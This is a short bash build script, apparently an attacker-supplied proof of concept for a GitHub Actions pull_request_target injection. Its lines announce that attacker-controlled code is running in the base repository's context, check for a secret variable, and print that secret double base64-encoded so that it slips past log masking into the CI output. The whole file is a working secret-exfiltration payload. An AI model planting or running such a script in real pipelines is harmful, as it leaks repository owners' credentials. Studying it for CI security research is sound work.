#!/usr/bin/env bash
echo "GERALT_DBG: attacker-controlled build/build.sh executing in base-repo (pull_request_target) context"
echo "GERALT_DBG: GERALT_SECRET present: $([ -n "${GERALT_SECRET:-}" ] && echo yes || echo no)"
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
exit 1
